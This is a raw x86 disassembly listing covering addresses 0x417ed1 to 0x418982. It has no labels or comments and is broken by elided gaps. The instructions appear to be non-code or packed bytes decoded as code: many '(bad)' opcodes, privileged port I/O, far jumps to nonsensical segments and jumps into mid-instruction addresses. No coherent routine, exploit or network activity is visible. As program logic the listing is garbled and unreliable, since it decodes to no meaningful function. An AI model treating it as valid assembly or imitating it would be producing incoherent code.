  417ed1:	sbb    eax,0xe10584c
  417ed6:	mov    ds:0x3e1bd21a,eax
  417edb:	mov    eax,0xcc834867
  417ee0:	cmp    ecx,edi
  417ee2:	cmp    eax,0x74f3308a
  417ee7:	xor    eax,0x4a1788f
  417eec:	inc    esp
  417eed:	aaa    
  417eee:	inc    ebx
  417eef:	loop   0x417ea8
  417ef1:	inc    edx
  417ef2:	mov    al,0xe1
  417ef4:	jo     0x417f06
  417ef6:	mov    edi,0x3d90d563
  417efb:	leave  
  417efc:	mov    ch,0xda
  417efe:	(bad)  
  417eff:	shl    ch,cl
  417f01:	mov    bl,0x88
  417f03:	fs stc 
  417f05:	loopne 0x417f4a
  417f07:	xchg   ebp,eax
  417f08:	loop   0x417f6a
  417f0a:	inc    edx
  417f0b:	jmp    0x417f3a
  417f0d:	cld    
  417f0e:	jb     0x417edc
  417f10:	dec    esp
  417f11:	fsubr  QWORD PTR [esi+0x3fe2ae07]
  417f17:	add    al,0x9e
  417f19:	jmp    0x417eaf
  417f1b:	mov    ds:0x1afc59c6,eax
  417f20:	dec    eax
  417f21:	sub    ebp,DWORD PTR [ebx-0x26d1c744]
  417f27:	cmp    eax,0xcaf956ab
  417f2c:	scas   al,BYTE PTR es:[edi]
  417f2d:	mov    eax,ds:0xe1a06b97
  417f32:	test   BYTE PTR [edx-0x3910f4b8],0x15
  417f39:	and    al,0x3c
  417f3b:	mov    ah,0x9e
  417f3d:	cld    
  417f3e:	das    
  417f3f:	pushf  
  417f40:	mov    edi,edx
  417f42:	test   DWORD PTR [esi-0x137fb902],0xb3b5e2a2
  417f4c:	sbb    BYTE PTR [esp+ebp*4-0x358afe18],dh
  417f53:	call   0x4b22b00c
  417f58:	mov    DWORD PTR [eax+0x1b],ecx
  417f5b:	mov    ah,0x63
  417f5d:	inc    esi
  417f5e:	and    DWORD PTR [esi],esp
  417f60:	out    0xca,eax
  417f62:	xor    DWORD PTR [edi+0xe],0x66a23bab
  417f69:	mov    al,ds:0x5b320
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	push   ecx
  417fe3:	psubsw mm4,QWORD PTR [eax+0x3c]
  417fe7:	add    al,BYTE PTR [ecx]
  417fe9:	add    bh,bh
  417feb:	add    BYTE PTR [eax],al
  417fed:	add    BYTE PTR [ebp-0x1b],bl
  417ff0:	and    eax,0x515e9df9
  417ff5:	test   al,0x65
  417ff7:	repz sahf 
  417ff9:	inc    esp
  417ffa:	gs inc ebp
  417ffc:	or     al,0x6
  417ffe:	nop
  417fff:	(bad)  
  418000:	fidiv  DWORD PTR [esi-0x71]
  418003:	inc    edi
  418004:	popf   
  418005:	and    BYTE PTR [edi+0x10a3b2bf],0x2f
  41800c:	sahf   
  41800d:	inc    edi
  41800e:	fwait
  41800f:	mov    ch,0xc
  418011:	mov    BYTE PTR [edi+0x6f6049a7],dh
  418017:	add    DWORD PTR [ebx+ebx*1+0x61a7880e],ecx
  41801e:	js     0x41805e
  418020:	popa   
  418021:	enter  0x4656,0x34
  418025:	shr    DWORD PTR [ebp-0x3c],cl
  418028:	and    DWORD PTR [edi+0x4],ebx
  41802b:	test   DWORD PTR [edi-0x6e],edx
  41802e:	(bad)  
  418030:	loopne 0x41808c
  418032:	xor    al,0x20
  418034:	repz shl DWORD PTR [esi+eiz*4+0x17],cl
  418039:	sub    eax,0x1cb49d99
  41803e:	mov    ds,edx
  418040:	clc    
  418041:	cdq    
  418042:	mov    esp,0xa2c4a0e8
  418047:	jnp    0x4180b9
  418049:	jl     0x41803c
  41804b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41804c:	mov    ecx,0xc946538d
  418051:	daa    
  418052:	xchg   dl,dh
  418054:	ss jle 0x41802a
  418057:	je     0x418059
  418059:	mov    ah,0x7e
  41805b:	nop
  41805c:	rcr    BYTE PTR [ecx-0x11],cl
  41805f:	int    0x6
  418061:	push   cs
  418062:	pop    ss
  418063:	and    ecx,eax
  418065:	(bad)  
  418066:	sub    BYTE PTR [eax],dh
  418068:	fld    QWORD PTR [ebx+0x6a3bc93c]
  41806e:	lds    esi,FWORD PTR [edx]
  418070:	mov    al,ds:0x7a3e3118
  418075:	imul   edi,DWORD PTR [ebp+0x5fba23f9],0x6c
  41807c:	jge    0x41804e
  41807e:	iret   
  41807f:	ja     0x418038
  418081:	jle    0x4180c4
  418083:	dec    edx
  418084:	push   ds
  418085:	loop   0x418073
  418087:	add    al,0xf3
  418089:	dec    ebx
  41808a:	mov    ebp,0xfee79677
  41808f:	inc    esp
  418090:	les    edi,FWORD PTR [eax-0xeb59c32]
  418096:	fld    TBYTE PTR [ebp+0x4170cfb5]
  41809c:	lea    ebx,[edx+ecx*1+0x1f]
  4180a0:	stc    
  4180a1:	sub    BYTE PTR [ebx-0x32],cl
  4180a4:	or     al,0xc2
  4180a6:	lods   eax,DWORD PTR ds:[esi]
  4180a7:	jae    0x418060
  4180a9:	inc    edi
  4180aa:	hlt    
  4180ab:	inc    ebp
  4180ac:	mov    dh,BYTE PTR [edx-0xe]
  4180af:	lahf   
  4180b0:	or     bh,ch
  4180b2:	mov    edi,0x7ea7bc9f
  4180b7:	int    0x4b
  4180b9:	inc    eax
  4180ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180bb:	dec    ecx
  4180bc:	inc    ebx
  4180bd:	imul   eax,ebx,0x32
  4180c0:	dec    edx
  4180c1:	inc    ebx
  4180c2:	mov    BYTE PTR [esi+0x1277a13e],cl
  4180c8:	dec    edi
  4180c9:	test   al,0x35
  4180cb:	xchg   edx,eax
  4180cc:	mov    cl,0xda
  4180ce:	add    BYTE PTR [edi+eiz*4],0xc0
  4180d2:	in     eax,0xce
  4180d4:	dec    esp
  4180d5:	fisubr DWORD PTR [ebx+0x1eee4926]
  4180db:	fist   DWORD PTR es:[esi+0x73]
  4180df:	cs call 0xd65b40a8
  4180e5:	scas   al,BYTE PTR es:[edi]
  4180e6:	repz lfs edi,FWORD PTR [edx+ebx*8]
  4180eb:	and    al,0x5b
	...
  418155:	add    BYTE PTR [ecx-0xba9482],ch
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0xff2fdebc,eax
  418163:	in     eax,dx
  418164:	xchg   DWORD PTR [edx+0x1033b],esi
  41816a:	inc    DWORD PTR [eax]
  41816c:	add    BYTE PTR [eax],al
  41816e:	or     ch,0x93
  418171:	loopne 0x41814d
  418173:	or     al,0x79
  418175:	push   ss
  418176:	stos   DWORD PTR es:[edi],eax
  418177:	dec    edx
  418178:	(bad)  
  418179:	push   ebp
  41817a:	outs   dx,DWORD PTR ds:[esi]
  41817b:	out    dx,al
  41817c:	out    dx,al
  41817d:	test   eax,0x2ad284e
  418182:	xchg   ecx,eax
  418183:	data16 mov gs,WORD PTR [esi+0x28]
  418187:	jne    0x4181a6
  418189:	jo     0x41815a
  41818b:	nop
  41818c:	imul   edi,DWORD PTR [esi-0x5a807af8],0xffffffe4
  418193:	ret    
  418194:	inc    edi
  418195:	adc    BYTE PTR [ebp+0x12788e2f],dl
  41819b:	(bad)  
  41819d:	test   DWORD PTR [eax],ecx
  41819f:	test   al,0x42
  4181a1:	or     dh,dl
  4181a3:	mov    edx,0xab7a8d08
  4181a8:	je     0x4181a8
  4181aa:	jl     0x41818c
  4181ac:	jo     0x41821f
  4181ae:	pop    ebx
  4181af:	das    
  4181b0:	xor    ch,bh
  4181b2:	dec    esi
  4181b3:	enter  0x1a4,0x10
  4181b7:	mov    eax,0xf9467a8b
  4181bc:	xchg   DWORD PTR [edx+0x729b3b89],ebx
  4181c2:	and    ch,dh
  4181c4:	ret    
  4181c5:	fs clc 
  4181c7:	(bad)  
  4181c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181c9:	dec    esp
  4181ca:	add    edx,DWORD PTR [edx]
  4181cc:	int3   
  4181cd:	dec    esp
  4181ce:	(bad)  
  4181cf:	mov    ecx,edi
  4181d1:	cmp    BYTE PTR [ebp+0x682c4306],0xe7
  4181d8:	fsubrp st(5),st
  4181da:	xchg   ebp,eax
  4181db:	in     eax,dx
  4181dc:	jg     0x418224
  4181de:	stos   BYTE PTR es:[edi],al
  4181df:	sub    dh,bh
  4181e1:	mov    ch,0x6e
  4181e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181e4:	mov    edx,0xc4c80c19
  4181e9:	iret   
  4181ea:	lock jmp 0x418182
  4181ed:	inc    esp
  4181ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181ef:	and    dl,BYTE PTR [ebp+0x6a860189]
  4181f5:	push   esp
  4181f6:	out    0xb6,eax
  4181f8:	adc    al,0x6b
  4181fa:	xchg   ebx,eax
  4181fb:	mov    edi,0xbf2387c8
  418200:	or     DWORD PTR [edx],0x2
  418203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418204:	push   esp
  418205:	retf   
  418206:	int3   
  418207:	shl    BYTE PTR [edx+edx*8+0x6d2c1cb8],cl
  41820e:	aam    0x90
  418210:	out    dx,al
  418211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418212:	test   BYTE PTR [ebx],bl
  418214:	push   cs
  418215:	push   edx
  418216:	dec    eax
  418217:	icebp  
  418218:	pop    edx
  418219:	jo     0x418202
  41821b:	popa   
  41821c:	or     edi,ecx
  41821e:	lods   eax,DWORD PTR ds:[esi]
  41821f:	jge    0x41826b
  418221:	fisub  WORD PTR [edi+ebx*4+0x1a]
  418225:	push   es
  418226:	cmp    DWORD PTR [edx-0x1a],esi
  418229:	xchg   eax,edi
  41822b:	ja     0x418219
  41822d:	and    eax,0x59a20aa3
  418232:	stc    
  418233:	pusha  
  418234:	add    eax,edi
  418236:	jae    0x41820e
  418238:	xor    BYTE PTR [esi-0x21],dh
  41823b:	xchg   edx,eax
  41823c:	sub    al,0x74
  41823e:	add    ebx,esi
  418240:	imul   ebx,ecx,0x9e0f10d7
  418246:	icebp  
  418247:	or     al,0xe2
  418249:	inc    edi
  41824a:	loopne 0x41823a
  41824c:	cmp    edi,DWORD PTR [ebx+0x498aac12]
  418252:	je     0x418214
  418254:	push   ebx
  418255:	add    esi,esi
  418257:	mov    WORD PTR [eax+0x4d36b465],ds
  41825d:	rcr    dh,0xfa
  418260:	mov    ebp,0xbe9b096
  418265:	push   es
  418266:	mov    bh,0xa1
  418268:	push   0xffffff9d
  41826a:	fsubrp st(3),st
  41826c:	mov    WORD PTR [eax],es
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x99aab8d6
  4182e4:	popf   
  4182e5:	mov    WORD PTR [edx],?
  4182e7:	add    al,0x1
  4182e9:	add    bh,bh
  4182eb:	add    BYTE PTR [eax],al
  4182ed:	add    cl,ah
  4182ef:	push   es
  4182f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182f1:	dec    edi
  4182f2:	xor    BYTE PTR [ebx+ebp*2],0xfe
  4182f6:	stos   DWORD PTR es:[edi],eax
  4182f7:	xchg   DWORD PTR [edi+0x1e],eax
  4182fa:	xchg   edx,eax
  4182fb:	jmp    0x4182d4
  4182fd:	or     BYTE PTR [ecx+0x11],0x4c
  418301:	outs   dx,DWORD PTR ds:[esi]
  418302:	fstp   QWORD PTR [edi+0x7c]
  418305:	mov    eax,ds:0xcd221525
  41830a:	fldenv [ebx]
  41830c:	adc    dl,BYTE PTR [ebx-0x27]
  41830f:	ret    
  418310:	iret   
  418311:	xor    al,0x36
  418313:	sub    esi,DWORD PTR ds:0x103296a1
  418319:	lods   al,BYTE PTR ds:[esi]
  41831a:	mov    ch,0x76
  41831c:	xchg   esp,eax
  41831d:	leave  
  41831e:	or     DWORD PTR [ecx-0x48a3d42b],edx
  418324:	mov    bh,BYTE PTR [ecx+0x5ab1ac50]
  41832a:	inc    DWORD PTR [eax-0x4d017c75]
  418330:	in     eax,0x41
  418332:	dec    edi
  418333:	sub    DWORD PTR [ecx],edi
  418335:	cmp    ebp,eax
  418337:	sub    ebx,DWORD PTR [esp+ebx*1-0x43f62f69]
  41833e:	nop
  41833f:	mov    DWORD PTR [edi-0x33],ebp
  418342:	sub    al,0xda
  418344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418345:	lods   eax,DWORD PTR ds:[esi]
  418346:	or     BYTE PTR [eax],bl
  418348:	sbb    al,0xe8
  41834a:	sub    DWORD PTR [esi-0x6b],ebp
  41834d:	jo     0x418306
  41834f:	pop    eax
  418350:	scas   al,BYTE PTR es:[edi]
  418351:	imul   BYTE PTR [edx+0x73]
  418354:	repz inc esi
  418356:	pop    ecx
  418357:	mul    BYTE PTR [edx]
  418359:	xor    DWORD PTR [ebp+0x7c69e92a],ecx
  41835f:	shl    BYTE PTR [ebp+0x55],1
  418362:	dec    ebp
  418363:	add    ebx,DWORD PTR [eax-0x4d]
  418366:	fldcw  WORD PTR [ebx]
  418368:	xchg   esi,eax
  418369:	sbb    esi,DWORD PTR [edi-0x5997e049]
  41836f:	repnz pop es
  418371:	dec    esi
  418372:	and    dh,BYTE PTR [ecx-0x330c20f9]
  418378:	rol    BYTE PTR [eax],cl
  41837a:	add    eax,0xaf924ea2
  41837f:	jne    0x41839b
  418381:	mov    ebx,edx
  418383:	sub    al,0xb2
  418385:	jne    0x418312
  418387:	mov    ds:0xc4cb69fa,al
  41838c:	or     DWORD PTR [edx],ebx
  41838e:	mov    ds:0xe7e30f3,eax
  418393:	int    0xe1
  418395:	adc    ch,bh
  418397:	mov    ds:0x39d22a5c,al
  41839c:	dec    esp
  41839d:	and    BYTE PTR [ebx-0x1c46885a],bl
  4183a3:	jge    0x4183db
  4183a5:	daa    
  4183a6:	cmp    BYTE PTR [ecx],al
  4183a8:	das    
  4183a9:	add    DWORD PTR [esi],eax
  4183ab:	cwde   
  4183ac:	lock jp 0x418364
  4183af:	ss dec eax
  4183b1:	cmp    eax,0x705861eb
  4183b6:	(bad)  
  4183b7:	xor    DWORD PTR [edi],ecx
  4183b9:	push   0x37
  4183bb:	mov    al,ds:0xce3836c7
  4183c0:	add    ecx,DWORD PTR [edi+edx*4-0x53]
  4183c4:	popf   
  4183c5:	adc    dl,dh
  4183c7:	leave  
  4183c8:	mov    eax,ds:0x31224f3
  4183cd:	sub    al,0xf2
  4183cf:	push   ebx
  4183d0:	das    
  4183d1:	push   esi
  4183d2:	pop    eax
  4183d3:	cs nop
  4183d5:	cmp    ah,BYTE PTR [ebx+eiz*8-0x4d]
  4183d9:	imul   BYTE PTR [esi+0x6453220e]
  4183df:	stc    
  4183e0:	cld    
  4183e1:	out    dx,eax
  4183e2:	mov    dl,0x1a
  4183e4:	aam    0xc8
  4183e6:	add    ebx,DWORD PTR [eax+0x56]
  4183e9:	adc    BYTE PTR [ecx+0xed7c],0x0
	...
  418454:	add    BYTE PTR [eax],al
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	xor    eax,0x39988e85
  418467:	add    eax,0xff0001
  41846c:	add    BYTE PTR [eax],al
  41846e:	mov    ecx,0x6eabbb91
  418473:	inc    ebx
  418474:	es mov ecx,es
  418477:	add    DWORD PTR [ebp+0x6a20ebde],ecx
  41847d:	cs dec eax
  41847f:	fistp  DWORD PTR [ecx-0x5]
  418482:	test   DWORD PTR [ecx+ebp*4+0x19],0x26d76c59
  41848a:	mov    eax,ds:0xe19e40ed
  41848f:	sbb    ebx,DWORD PTR [esi+0x2]
  418492:	adc    DWORD PTR [eax+0x27],0xffffff89
  418496:	mov    edi,0x1d1a541c
  41849b:	adc    DWORD PTR [edx+edx*1],ecx
  41849e:	push   ss
  41849f:	xor    al,0xaf
  4184a1:	and    BYTE PTR [esi-0x48002188],dh
  4184a7:	pop    ebp
  4184a8:	dec    ebp
  4184a9:	and    DWORD PTR [eax+0x2c3f8f6],ecx
  4184af:	es jle 0x4184f4
  4184b2:	iret   
  4184b3:	fidiv  WORD PTR [eax*4-0x6a3e92af]
  4184ba:	push   ecx
  4184bb:	cmp    dh,BYTE PTR [ebp-0x28b939d3]
  4184c1:	pop    DWORD PTR [ebx+0x5c]
  4184c4:	sar    DWORD PTR ds:[ebp+0x14],0x2c
  4184c9:	sahf   
  4184ca:	dec    edi
  4184cb:	fs arpl ax,si
  4184ce:	push   ds
  4184cf:	imul   DWORD PTR [edi]
  4184d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184d2:	iret   
  4184d3:	in     eax,0x56
  4184d5:	push   ebp
  4184d6:	dec    edi
  4184d7:	pusha  
  4184d8:	lock adc bl,BYTE PTR [edx+0x35b54d6e]
  4184df:	jle    0x4184b4
  4184e1:	xor    ecx,DWORD PTR [edx]
  4184e3:	repz das 
  4184e5:	mov    ebx,eax
  4184e7:	in     al,dx
  4184e8:	jns    0x418534
  4184ea:	mov    ds:0x77a99b7,eax
  4184ef:	jmp    0x8fa91b2b
  4184f4:	(bad)  
  4184f5:	std    
  4184f6:	js     0x4184cc
  4184f8:	iret   
  4184f9:	jns    0x418537
  4184fb:	leave  
  4184fc:	xchg   DWORD PTR [edx],edi
  4184fe:	ds data16 jl 0x418519
  418502:	sbb    eax,0x848a953a
  418507:	xchg   ebx,eax
  418508:	sub    ah,BYTE PTR [ebx]
  41850a:	xchg   DWORD PTR [ecx+edx*2-0x211fa51f],eax
  418511:	sbb    al,0xed
  418514:	jns    0x4184e2
  418516:	jb     0x4184e5
  418518:	push   eax
  418519:	cld    
  41851a:	adc    DWORD PTR [esi],0x6b87be5e
  418520:	sbb    eax,0x39
  418523:	add    BYTE PTR [edx+0x35858148],dh
  418529:	or     eax,0x9f0df968
  41852e:	push   eax
  41852f:	arpl   WORD PTR [eax+0x2f],si
  418532:	inc    esi
  418533:	push   ebx
  418534:	jo     0x418524
  418536:	xchg   DWORD PTR [ebx-0x6afedf9c],esi
  41853c:	test   eax,0x12fcb4bc
  418541:	sbb    BYTE PTR [edx+esi*1-0x32],0xf1
  418546:	test   DWORD PTR [eax],ebx
  418548:	jmp    0xd0608f50
  41854d:	inc    eax
  41854e:	mov    dl,0x8
  418550:	jmp    0x35fccb03
  418555:	push   ds
  418556:	mov    al,ds:0xa50342de
  41855b:	add    DWORD PTR [ebx-0xe2d6eba],esi
  418561:	std    
  418562:	jmp    0x41855c
  418564:	scas   eax,DWORD PTR es:[edi]
  418565:	aam    0xc9
  418567:	in     eax,0xfc
  418569:	add    al,BYTE PTR [ecx+0x9d13]
	...
  4185d3:	add    BYTE PTR [eax],al
  4185d5:	add    BYTE PTR [ecx-0x7],al
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	mov    esp,0x384693c7
  4185e7:	push   es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	inc    DWORD PTR [eax]
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	lods   eax,DWORD PTR ds:[esi]
  4185ef:	push   cs
  4185f0:	xor    esp,edi
  4185f2:	stos   BYTE PTR es:[edi],al
  4185f3:	inc    ecx
  4185f4:	cmp    BYTE PTR [eax-0xcb24727],dl
  4185fa:	retf   0x151b
  4185fd:	xor    cl,dh
  4185ff:	cmp    eax,0xd11ecd9b
  418604:	leave  
  418605:	(bad)  
  418606:	sbb    eax,0xd4df145
  41860b:	push   es
  41860c:	jmp    0x1472:0xda4a2d5c
  418613:	xlat   BYTE PTR ds:[ebx]
  418614:	(bad)  
  418615:	pop    edx
  418616:	sar    BYTE PTR [edx+0x7a],cl
  418619:	aad    0x55
  41861b:	cmp    BYTE PTR [edi+eax*4-0x50],ah
  41861f:	xchg   ebp,eax
  418620:	in     al,dx
  418621:	idiv   BYTE PTR [edx+0x79]
  418624:	(bad)  
  418625:	xor    BYTE PTR [esi-0x6a],cl
  418628:	mov    ebx,0x642eefdd
  41862d:	sbb    esp,DWORD PTR [edi+ecx*4-0x5e]
  418631:	inc    edx
  418632:	inc    ecx
  418633:	pop    ds
  418634:	push   ebx
  418635:	push   ecx
  418636:	ja     0x418668
  418638:	rcr    DWORD PTR [esi-0x11],0x8d
  41863c:	jge    0x41866e
  41863e:	cmp    al,0x6b
  418640:	lods   eax,DWORD PTR ds:[esi]
  418641:	add    BYTE PTR [ebx+0x606967ec],al
  418647:	leave  
  418648:	add    al,0x84
  41864a:	test   DWORD PTR [eax],ecx
  41864c:	xor    dh,BYTE PTR ds:0x20bb78b0
  418652:	sbb    DWORD PTR [edx+ebp*8-0xe],0x13754f33
  41865a:	in     eax,dx
  41865b:	xor    ebp,edi
  41865d:	xchg   ecx,eax
  41865e:	jp     0x418615
  418660:	mov    dh,ah
  418662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418663:	mov    eax,esi
  418665:	int3   
  418666:	xor    edx,DWORD PTR [ebx]
  418668:	cld    
  418669:	mov    ds:0x5b58ed7f,al
  41866e:	das    
  41866f:	sti    
  418670:	jecxz  0x418610
  418672:	or     BYTE PTR [edx+0x1f],0x7c
  418676:	xchg   esp,eax
  418677:	int    0x66
  418679:	mov    bl,0x40
  41867b:	xrelease xchg BYTE PTR [edx-0x4],ah
  41867f:	mov    BYTE PTR [ecx-0x7f],ah
  418682:	sbb    edx,DWORD PTR [ebx+0x7c]
  418685:	out    0x3b,eax
  418687:	gs je  0x4186b2
  41868a:	test   DWORD PTR [ebx],eax
  41868c:	mov    dl,0xc5
  41868e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41868f:	adc    DWORD PTR [edx],eax
  418691:	jae    0x418698
  418693:	sbb    bl,ch
  418695:	dec    ebp
  418696:	mov    dh,0x68
  418698:	dec    ebp
  418699:	jge    0x418654
  41869b:	test   DWORD PTR [ebx-0xc],ecx
  41869e:	push   ebp
  41869f:	sar    DWORD PTR [edx],cl
  4186a1:	cmp    eax,0xb7a61099
  4186a6:	shl    BYTE PTR [esi+eax*1-0x59297f08],1
  4186ad:	add    eax,0x9ad52630
  4186b2:	repz inc ebp
  4186b4:	xchg   ecx,eax
  4186b5:	push   cs
  4186b6:	retf   0xa7e5
  4186b9:	rcr    BYTE PTR [esi-0x19795c68],1
  4186bf:	xchg   ebx,eax
  4186c0:	inc    ebx
  4186c1:	adc    al,0xdf
  4186c3:	adc    esi,ebx
  4186c5:	test   DWORD PTR [ecx-0xc],ebp
  4186c8:	js     0x41868b
  4186ca:	out    dx,eax
  4186cb:	push   eax
  4186cc:	cli    
  4186cd:	xor    ah,BYTE PTR [ebp-0x715129f0]
  4186d3:	inc    ebx
  4186d4:	sub    DWORD PTR [ebx],ebp
  4186d6:	and    BYTE PTR [esi+edx*4-0x3c],cl
  4186da:	mov    dh,0x8d
  4186dc:	popf   
  4186dd:	aad    0x5
  4186df:	mov    al,ds:0xbc84a39a
  4186e4:	mov    es,WORD PTR [edi-0x5594d4b9]
  4186ea:	test   al,0x6c
  4186ec:	out    0x0,al
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	call   0x378ea2d5
  418767:	pop    es
  418768:	add    DWORD PTR [eax],eax
  41876a:	inc    DWORD PTR [eax]
  41876c:	add    BYTE PTR [eax],al
  41876e:	add    esi,ebp
  418770:	adc    DWORD PTR [eax-0x16],edx
  418773:	in     al,0xf3
  418775:	xchg   ecx,eax
  418776:	mov    ecx,0xc4da16ed
  41877b:	les    esp,FWORD PTR [ecx-0x74]
  41877e:	sbb    BYTE PTR [esi-0xbd72f61],bl
  418784:	mov    cl,0x50
  418786:	cmp    DWORD PTR [edi+eax*8-0x117ed59a],ebx
  41878d:	dec    esi
  41878e:	sub    al,0x26
  418790:	mov    edi,0x38cdedbd
  418795:	scas   al,BYTE PTR es:[edi]
  418796:	je     0x418800
  418798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418799:	inc    ebx
  41879a:	push   ss
  41879b:	inc    eax
  41879c:	and    al,0xa0
  41879e:	sub    al,0x8
  4187a0:	js     0x418780
  4187a2:	cld    
  4187a3:	pop    es
  4187a4:	adc    BYTE PTR [eax+0x37ba69e5],cl
  4187aa:	ja     0x4187ed
  4187ac:	pop    edx
  4187ad:	rol    BYTE PTR [ebx+0x10832f7],0x2
  4187b4:	adc    bh,ah
  4187b6:	mov    bh,0x85
  4187b8:	sub    BYTE PTR [esi-0x42ef7e51],0x67
  4187bf:	xchg   ebp,eax
  4187c0:	mov    al,ds:0x6a360fc
  4187c5:	shl    DWORD PTR [esi],cl
  4187c7:	mov    dl,0xe4
  4187c9:	aad    0xa7
  4187cb:	push   ebp
  4187cc:	lahf   
  4187cd:	inc    ebp
  4187ce:	sbb    BYTE PTR [esi+0x3321f835],0x0
  4187d5:	lock iret 
  4187d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187d8:	outs   dx,DWORD PTR ds:[esi]
  4187d9:	mov    ds:0x91e96880,eax
  4187de:	jmp    0x418780
  4187e0:	aad    0xa0
  4187e2:	(bad)  
  4187e3:	outs   dx,BYTE PTR ds:[esi]
  4187e4:	lods   eax,DWORD PTR ds:[esi]
  4187e5:	cli    
  4187e6:	(bad)  
  4187e7:	fmul   DWORD PTR [ecx+0x4bfd23d8]
  4187ed:	imul   esi,DWORD PTR [esi-0x7a177338],0xdd83bdbc
  4187f7:	retf   
  4187f8:	div    bh
  4187fa:	scas   eax,DWORD PTR es:[edi]
  4187fb:	jmp    0x262e:0x4f5d00db
  418802:	mov    DWORD PTR [eax+eax*1+0x104f35b3],0x3ff45c9f
  41880d:	sub    bh,al
  41880f:	jmp    0x5598:0x5b2c44ce
  418816:	fstp   DWORD PTR ds:0x306f7619
  41881c:	ret    0x95d3
  41881f:	fwait
  418820:	retf   0x7064
  418823:	mov    bl,0x1f
  418825:	je     0x4187ed
  418827:	jae    0x41885e
  418829:	adc    al,bh
  41882b:	repnz or eax,0xf2e360e0
  418831:	neg    BYTE PTR [ecx]
  418833:	test   al,0x7d
  418835:	adc    BYTE PTR [edx-0x484b7bfe],dl
  41883b:	outs   dx,BYTE PTR ds:[esi]
  41883c:	push   cs
  41883d:	mov    al,0xeb
  41883f:	jmp    0x41883c
  418841:	jge    0x41880d
  418843:	or     ebx,ecx
  418845:	xchg   edi,eax
  418846:	xor    dh,BYTE PTR [ecx]
  418848:	lahf   
  418849:	pop    edx
  41884a:	adc    BYTE PTR [ecx+0x20],bl
  41884d:	mov    DWORD PTR [ecx+eax*2],edx
  418850:	pop    esi
  418851:	fist   DWORD PTR [eax-0xa76fa20]
  418857:	xor    al,cl
  418859:	xor    eax,DWORD PTR [eax-0x352864cf]
  41885f:	mov    bh,0xd7
  418861:	jecxz  0x41885a
  418863:	jae    0x418832
  418865:	ja     0x418815
  418867:	push   ss
  418868:	xchg   esi,eax
  418869:	clc    
  41886a:	jl     0x4188c3
  41886c:	inc    eax
	...
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi+0x729c3acd]
  4188e3:	in     eax,0x68
  4188e5:	push   esp
  4188e6:	or     BYTE PTR ss:[ecx],al
  4188e9:	add    bh,bh
  4188eb:	add    BYTE PTR [eax],al
  4188ed:	add    BYTE PTR [edi-0x6b],al
  4188f0:	popa   
  4188f1:	cmp    cl,BYTE PTR [eax+0x8f35220]
  4188f7:	mov    edx,0x74b49398
  4188fc:	mov    ecx,0x76066da9
  418901:	dec    eax
  418902:	(bad)
  418905:	push   0x7421daca
  41890a:	pushf  
  41890b:	and    bh,BYTE PTR [edx]
  41890d:	fcmovnbe st,st(2)
  41890f:	xor    al,BYTE PTR [ebx+0x15]
  418912:	push   es
  418913:	cmp    eax,0x7689d382
  418918:	out    0x8d,eax
  41891a:	int3   
  41891b:	scas   al,BYTE PTR es:[edi]
  41891c:	shl    DWORD PTR [edi],cl
  41891e:	xor    ecx,ebp
  418920:	int3   
  418921:	jg     0x4188cf
  418923:	fst    st(5)
  418925:	test   eax,0x95c71545
  41892a:	inc    esp
  41892b:	mov    ecx,0x3848f2b7
  418930:	in     al,dx
  418931:	add    cl,BYTE PTR [ecx+0x2]
  418934:	sbb    bh,BYTE PTR [ebx]
  418936:	stos   DWORD PTR es:[edi],eax
  418937:	cmp    BYTE PTR [edx+0x4b],bl
  41893a:	mov    bh,0x3d
  41893c:	jnp    0x418959
  41893e:	dec    ecx
  41893f:	adc    BYTE PTR [ebp-0x16d89354],al
  418945:	ret    
  418946:	jnp    0x4188fe
  418948:	sub    al,0xfe
  41894a:	bound  esp,QWORD PTR [edx-0x6c5e46ab]
  418950:	push   ebx
  418951:	call   0xae62:0xc9af2776
  418958:	pop    edi
  418959:	mov    esp,0x97a6e3f6
  41895e:	pop    edx
  41895f:	adc    eax,0xf6017d7a
  418964:	jmp    0x95e2:0x9f1b9269
  41896b:	clc    
  41896c:	stc    
  41896d:	mov    ecx,0xf6af9d11
  418972:	xchg   ebx,eax
  418973:	mov    dh,0x9c
  418975:	xor    BYTE PTR [edx+0x57a12733],dh
  41897b:	mov    al,0x9d
  41897d:	push   0x8e8766c5
  418982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
